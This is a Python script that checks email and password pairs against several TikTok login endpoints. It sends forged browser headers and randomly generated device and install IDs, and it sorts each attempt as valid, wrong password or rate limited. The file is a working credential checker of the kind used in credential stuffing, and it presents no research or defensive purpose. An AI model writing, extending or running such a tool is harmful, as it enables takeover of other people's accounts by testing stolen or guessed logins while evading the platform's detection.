import hashlib
import random
import time
import requests
import os

# Multiple endpoints to try (TikTok changes these frequently)
ENDPOINTS = [
    "https://www.tiktok.com/api/v1/auth/email/login/",
    "https://api16-normal-c-useast1a.tiktokv.com/passport/web/email/login/",
    "https://api.tiktokv.com/passport/web/email/login/",
    "https://www.tiktok.com/passport/web/email/login/",
]

def check_credentials(email: str, password: str) -> dict:
    device_id = str(random.randint(7250000000000000000, 7350000000000000000))
    install_id = str(random.randint(100000000000, 999999999999))

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Origin": "https://www.tiktok.com",
        "Referer": "https://www.tiktok.com/login/email",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "X-Requested-With": "XMLHttpRequest",
    }

    params = {
        "device_id": device_id,
        "iid": install_id,
        "device_type": "Pixel+4",
        "os_version": "29",
        "app_name": "musical_ly",
        "app_version": "22.9.5",
        "version_code": "220905",
        "language": "en",
        "region": "US",
        "sys_region": "US",
        "carrier_region": "US",
        "ts": str(int(time.time())),
    }

    pw_md5 = hashlib.md5(password.encode("utf-8")).hexdigest()
    
    payload = {
        "email": email,
        "password": pw_md5,
        "mix_mode": "1",
        "account_sdk_source": "app",
    }

    # Try each endpoint
    for endpoint in ENDPOINTS:
        for attempt in range(2):
            try:
                print(f"Trying endpoint: {endpoint}")
                resp = requests.post(
                    endpoint,
                    headers=headers,
                    params=params,
                    data=payload,
                    timeout=20,
                )
                
                print(f"Status code: {resp.status_code}")
                print(f"Response: {resp.text[:200]}")  # Log first 200 chars
                
                if resp.status_code == 200:
                    data = resp.json()
                    error_code = data.get("error_code", -1)
                    
                    if error_code == 0:
                        return {
                            "success": True,
                            "status": "valid",
                            "message": "Credentials are valid",
                            "account": {"username": email}
                        }
                    elif error_code == 1102:
                        return {
                            "success": False,
                            "status": "bad_password",
                            "message": "Incorrect password"
                        }
                    elif error_code in [1105, 1106]:
                        return {
                            "success": False,
                            "status": "rate_limited",
                            "message": "Too many attempts. Please try again later."
                        }
                    else:
                        # Continue to next endpoint if this one failed
                        break
                else:
                    # Continue to next endpoint
                    break
                    
            except requests.exceptions.Timeout:
                print(f"Timeout on {endpoint}")
                continue
            except Exception as e:
                print(f"Error on {endpoint}: {str(e)}")
                continue
    
    # If all endpoints fail
    return {
        "success": False,
        "status": "error",
        "message": "Unable to verify credentials. TikTok's API may have changed or is blocking requests."
    }
